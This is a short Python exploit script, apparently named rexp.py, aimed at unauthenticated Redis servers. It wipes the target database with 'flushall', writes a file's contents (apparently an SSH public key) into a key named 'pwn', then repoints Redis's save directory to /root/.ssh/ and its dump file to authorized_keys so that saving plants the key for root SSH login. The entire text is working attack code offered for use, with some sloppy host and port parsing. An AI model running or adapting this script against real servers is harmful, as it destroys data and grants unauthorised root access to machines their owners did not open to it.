import socket
from os import system
from sys import argv
def send(conn,cmd):
	try:
		conn.send(cmd+"\n")
		recv=conn.recv(5) 
		#conn.close()	
		recv=recv.replace("\n",''),
		return recv
	except:
		return False
	
def conn_redis(args):
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	args=args.split(":")
	host=args[0]
	port=int(args[1])
	try:
		client.connect((host, port))
		return client
	except:
		return False
		
if len(argv)!=2:
	print "Usage: python rexp.py 127.0.0.1:6379"
	exit()
host=argv[1]
host.split(":")
port=6379
if len(host)==2:
	port=int(host[1])
conn=conn_redis("%s:%d"%(host,port))
send(conn,"flushall")
system("cat foo.txt| redis-cli -h %s -p %d -x set pwn"%(host,port))
cmd='''CONFIG set dir /root/.ssh/
config set dbfilename authorized_keys
save
exit'''
cmd=cmd.split("\n")
for c in cmd:
	send(conn,c)
